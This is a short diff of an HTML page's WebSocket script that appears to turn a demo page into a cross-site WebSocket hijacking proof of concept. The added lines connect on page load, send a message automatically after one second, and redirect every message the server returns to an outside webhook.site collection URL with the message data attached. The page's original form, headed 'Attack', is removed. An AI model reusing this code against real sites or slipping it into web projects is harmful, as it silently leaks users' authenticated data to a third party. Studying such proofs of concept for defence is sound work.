@@ -12,28 +12,14 @@
       location.reload()
     };
     connection.onmessage = function (message) {
-      console.log(message)
+       window.location.href='https://webhook.site/146cd106-3201-4796-96fd-09bc225afd98?message=' + message.data
     };
     connection.onclose = function(message) {
      console.log(message)
     }
     function sendMessage() {
-        var message = document.getElementById("message").value;
-        if (message.length > 0) {
-            connection.send(message);
-            document.getElementById("message").value = "";
-        }
+        var message = "hello";
+        connection.send(message);
     }
-
+    setTimeout(sendMessage, 1000);
 </script>
-<div class="container">
-    <div class="row">
-        <div class="col-md-12">
-            <h1>Attack</h1>
-            <div class="form-group">
-                <label for="message">Message:</label>
-                <input type="text" id="message" class="form-control" placeholder="Enter your message here...">
-            </div>
-            <button onclick="sendMessage()" class="btn btn-primary">Send</button>
-        </div>
-    </div>
